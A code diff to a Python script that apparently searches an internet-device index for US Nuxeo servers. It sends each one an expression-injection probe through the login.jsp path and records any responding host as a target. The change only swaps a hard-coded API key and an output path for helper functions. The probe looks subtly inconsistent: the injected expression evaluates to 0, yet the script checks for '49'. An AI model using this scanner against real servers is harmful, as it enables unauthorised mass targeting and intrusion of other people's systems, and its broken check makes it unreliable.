@@ -14,7 +14,13 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
-API_KEY = "YOURAPIKEY"
+import os
+import sys
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from common import get_api_key, open_output
+
+API_KEY = get_api_key()
 SEARCH_FOR = '/nuxeo/ country:"US" port:"443"'
 FILE = "/nuxeo/login.jsp/pwn${-7+7}.xhtml"
 session = requests.Session()
@@ -35,7 +41,7 @@ def grab_file (IP,PORT,FILE):
 		response = session.get(URL, headers=headers, timeout=15, verify=False)
 		result = response.text
 		if '49' in result:
-			text_file = open("./cfg/nuxeo.cfg", "a")
+			text_file = open_output("cfg/nuxeo.cfg", "a")
 			text_file.write("https://"+IP+":"+PORT+"\n")
 			text_file.close()
 			print ("[*] Nuxeo... Found [*]\n")
